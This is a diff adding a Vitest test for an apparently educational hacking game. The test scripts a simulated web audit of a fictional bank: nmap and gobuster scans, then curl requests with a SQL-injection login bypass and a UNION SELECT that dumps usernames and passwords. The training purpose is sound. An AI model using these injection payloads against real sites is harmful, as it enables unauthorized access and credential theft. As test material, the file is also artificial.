@@ -1,0 +1,59 @@
+import { beforeEach, describe, expect, it } from "vitest";
+import { VirtualKernel } from "../VirtualKernel";
+import { VirtualTerminal } from "../terminal/VirtualTerminal";
+import { resetStorage, seedRandom } from "../../test/setup";
+
+/**
+ * Anti-mock del ENGAGEMENT web: la auditoría guiada de punta a punta tiene que
+ * ser completable de verdad contra el motor. Conducimos la terminal por cada
+ * etapa —comandos reales y respuestas ('responder ...') a las preguntas de
+ * interpretación— y exigimos que la lección se complete y que caigan las dos
+ * banderas web. Si algún paso deja de validar, este test lo caza.
+ */
+describe("Engagement web — auditá el banco de punta a punta", () => {
+  let kernel: VirtualKernel;
+  let term: VirtualTerminal;
+
+  beforeEach(() => {
+    resetStorage();
+    seedRandom();
+    kernel = new VirtualKernel();
+    term = new VirtualTerminal(kernel);
+  });
+
+  it("l-eng-web se completa siguiendo la metodología real", () => {
+    // Secuencia: comando de acción o 'responder <x>' en los pasos de pregunta.
+    const flow = [
+      "learn l-eng-web",
+      "nmap -sV banco.nande",
+      "responder 80",
+      "gobuster dir -u http://banco.nande -w comun",
+      "responder /login",
+      "curl -X POST http://banco.nande/login -d \"usuario=admin' OR '1'='1 --&password=x\"",
+      "responder admin",
+      "curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
+      "responder M8arete-2024!",
+      "responder preparadas",
+    ];
+
+    let last = "";
+    for (const cmd of flow) last = term.execute(cmd);
+
+    // La última respuesta cierra la lección.
+    expect(last, "el último paso debería cerrar la lección").toMatch(/Lección completada/i);
+    expect(kernel.player.completedCourses()).toContain("lesson:l-eng-web");
+    // Y por el camino capturó las dos banderas web, de verdad.
+    const flags = kernel.player.capturedFlags();
+    expect(flags).toContain("ND{sqli_login_bypass}");
+    expect(flags).toContain("ND{sqli_union_dump}");
+  });
+
+  it("no avanza si respondés cualquier cosa a una pregunta", () => {
+    term.execute("learn l-eng-web");
+    term.execute("nmap -sV banco.nande");
+    const bad = term.execute("responder cualquiercosa");
+    expect(bad).toMatch(/No es esa|Volvé a leer/i);
+    // Sigue en el paso de la pregunta (no se completó).
+    expect(kernel.player.completedCourses()).not.toContain("lesson:l-eng-web");
+  });
+});
